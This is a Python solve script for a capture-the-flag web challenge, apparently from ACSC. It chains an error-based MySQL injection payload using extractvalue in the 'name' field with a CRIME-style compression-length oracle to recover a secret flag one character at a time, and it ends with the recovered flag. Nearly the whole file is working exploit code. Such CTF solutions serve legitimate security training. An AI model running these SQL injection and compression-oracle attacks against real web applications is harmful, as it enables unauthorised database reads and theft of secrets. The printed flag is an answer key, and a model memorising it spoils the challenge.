#!/usr/bin/env python3

import httpx
import asyncio
import string

url = "https://secret-saver.chal.acsc.asia/"


async def check_length(client, msg):
    
    id = (
        await client.post(
            url,
            data={"msg": "^^^^^^^^" + msg * 3, "name": "!" * 8},
        )
    ).text
    r = await client.post(
        url,
        data={
            "msg": "^^^^^^^^",
            "name": f"'||extractvalue(1,concat(0x5c,(select * from (select length(msg) from msgs where id = '{id}') as t),0x5c))||'",
        },
    )
   
    return int(r.text.split("\\")[1])


async def main():
    async with httpx.AsyncClient(verify=False, http2=True) as client:
        chs = string.printable
        flag = "ACSC{"
        while not flag.endswith("}"):
            lns = await asyncio.gather(
                *[check_length(client, flag + c + "^$%(~`-1*") for c in chs]
            )
            i = lns.index(min(lns))
            flag += chs[i]
            print(flag)


asyncio.run(main())

# ACSC{MAK3-CRiME-4TT4CK-GREAT-AGaiN!}